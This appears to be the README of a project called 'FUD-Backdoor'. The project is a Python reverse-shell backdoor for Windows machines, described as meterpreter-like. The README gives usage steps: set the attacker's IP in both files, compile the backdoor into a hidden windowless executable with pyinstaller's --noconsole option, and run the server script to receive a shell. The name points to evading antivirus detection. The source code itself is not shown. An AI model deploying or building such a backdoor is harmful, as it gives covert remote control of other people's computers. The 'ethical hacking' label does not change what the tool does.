# FUD-Backdoor
This is a very simple design to implement the meterpreter-like sessions exclusively for a <i>**windows**</i> target machine. This is written purely in Python and it wouldn't need installation of any modules as the modules which are used in this come preinstalled with python.
## Usage
enter the ip address of the host machine in both the files on which you want to get a shell on.
### for backdoor
once the backdoor file is downloaded, it needs to be converted into a ".exe" (executable) file.
navigate to the directory of the downloaded backdoor.py file on the target/windows machine. Then execute the following command:  
```
pip install pyinstaller  
pyinstaller "backdoor.py" --onefile --noconsole  
```
The .exe file would be in the `dist` folder.

### for server
Run the server file using `python3 server.py` and wait for 20 secs (you can change it), the shell will be created. 

The main purpose of this project is for Exploitation part of Ethical Hacking.
